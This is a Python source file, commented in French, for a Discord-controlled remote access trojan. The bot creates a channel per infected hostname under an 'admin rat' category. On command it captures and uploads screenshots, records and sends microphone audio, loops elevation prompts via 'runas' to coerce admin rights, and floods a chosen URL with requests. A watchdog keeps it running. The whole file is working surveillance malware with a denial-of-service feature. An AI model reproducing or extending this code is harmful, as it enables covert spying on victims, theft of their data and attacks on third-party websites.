import discord
from discord.ext import commands
import pyautogui
import socket
import sys
import asyncio
import time
import threading
import ctypes
import sounddevice as sd
from scipy.io.wavfile import write
import aiohttp
import requests


def connection():
    try:
        system_name = socket.gethostname().lower()
        def adm():
            global rng
            rng = True
            while rng:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )

        def start_adm():
            global worker_thread
            # Créer et démarrer le thread
            worker_thread = threading.Thread(target=adm)
            worker_thread.start()

        def stop_adm():
            global rng
            rng = False
            # Attendre que le thread se termine
            worker_thread.join()
            print("Le thread a été arrêté.")


        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


        TOKEN = 'discord token here'
        intents = discord.Intents.all()
        intents.message_content = True
        bot = commands.Bot(command_prefix='!', intents=intents)

        @bot.event
        async def on_ready():
            print(f'Connected as {bot.user.name}')
            for guild in bot.guilds:
                category = discord.utils.get(guild.categories, name="admin rat")
                if category:
                    existing_channel = discord.utils.get(category.channels, name=system_name)
                    if not existing_channel:
                        await category.create_text_channel(system_name)
                        print(f"Channel {system_name} created in category admin rat.")
                        return
                else:
                    print("Category 'admin rat' not found.")
            print(f"Channel {system_name} already exists.")



        @bot.command()
        async def cmds(ctx, cmd: str):
            print(ctx)
            channel_name = ctx.channel.name
            if system_name == channel_name:
                if cmd == 'hepl':
                    await ctx.send("test good")
                if cmd == 'screen':
                    print('screen')
                    screenshot = pyautogui.screenshot()
                    screenshot.save("C:\\Users\\Public\\screenshot.png")
                    time.sleep(1)
                    await ctx.send(file=discord.File("C:\\Users\\Public\\screenshot.png"))
                    print('src send')
                if cmd == 'stopadm':
                    print('stop adm')
                    stop_adm()
                if cmd == 'startadm':
                    print('start adm')
                    start_adm()
            else:
                pass


        @bot.command()
        async def wbattk(ctx, cmd: int, wb: str):
            async with aiohttp.ClientSession() as session:
                for _ in range(cmd):
                    async with session.get(wb) as response:
                        print(response.status)


        @bot.command()
        async def engsd(ctx, cmd: int):
            channel_name = ctx.channel.name
            if system_name == channel_name:
                framerate = 44100
                duree = cmd
                nom_fichier = 'C:\\Users\\Public\\enregistrement.wav'

                print("L'enregistrement débute!")
                enregistrement = sd.rec(int(duree * framerate), samplerate=framerate, channels=2)
                sd.wait()  # Attendre la fin de l'enregistrement
                print("L'enregistrement est terminé!")

                write(nom_fichier, framerate, enregistrement)  # Sauver l'enregistrement comme fichier wav
                await ctx.send(file=discord.File(nom_fichier))  # Envoyer le fichier
            else:
                pass


        bot.run(TOKEN)
    except Exception as e:
        print(f'erreur bot : {e}')

def start_ctn():
    global worker_thread
    # Créer et démarrer le thread
    worker_thread = threading.Thread(target=connection)
    worker_thread.start()

def stop_ctn():
    global ct
    ct = False
    # Attendre que le thread se termine
    worker_thread.join()
    print("Le thread a été arrêté.")

def main():
    startings = False
    while True:
        print(startings)

        try:
            time.sleep(5)
            s = requests.get('https://discord.com')
            print(s.status_code)
            if s.status_code == 200:
                print('connected ')
                if startings == False:
                    try:
                        startings = True
                        start_ctn()
                    except:
                        pass
                else:
                    pass
            else:
                print('erreur 4261')
                if startings == True:
                    try:
                        startings = False
                        stop_ctn()
                    except:
                        pass
                else:
                    pass

        except Exception as e:
            print(e)
            time.sleep(2)
            print('not connected')
            if startings == True:
                print('debug')
                try:
                    startings = False
                    print('debug2')
                    stop_ctn()
                    print('ctn stop')
                except:
                    pass
                main()
            else:
                pass

main()
